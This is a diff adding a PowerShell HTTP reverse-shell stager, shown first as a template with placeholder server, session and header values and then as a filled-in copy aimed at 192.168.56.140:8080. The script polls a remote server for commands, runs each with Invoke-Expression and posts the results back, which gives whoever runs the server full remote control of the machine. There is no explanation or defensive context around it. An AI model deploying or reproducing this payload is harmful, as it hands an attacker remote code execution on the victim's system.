@@ -1,0 +1,18 @@
+$s='*SERVERIP*';
+$i='*SESSIONID*';
+$p='http://';
+$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/*VERIFY* -Headers @{"*HOAXID*"=$i};
+while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/*GETCMD* -Headers @{"*HOAXID*"=$i}).Content;
+if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;
+$r=Out-String -InputObject $r;
+$t=Invoke-WebRequest -Uri $p$s/*POSTRES* -Method POST -Headers @{"*HOAXID*"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep *FREQ*}
+
+
+$s='192.168.56.140:8080';
+$i='a344efca-ee2cf65b-5ad05317';
+$p='http://';
+$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/a344efca -Headers @{"X-1458-fcfc"=$i};
+while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/ee2cf65b -Headers @{"X-1458-fcfc"=$i}).Content;
+if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;
+$r=Out-String -InputObject $r;
+$t=Invoke-WebRequest -Uri $p$s/5ad05317 -Method POST -Headers @{"X-1458-fcfc"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8} 
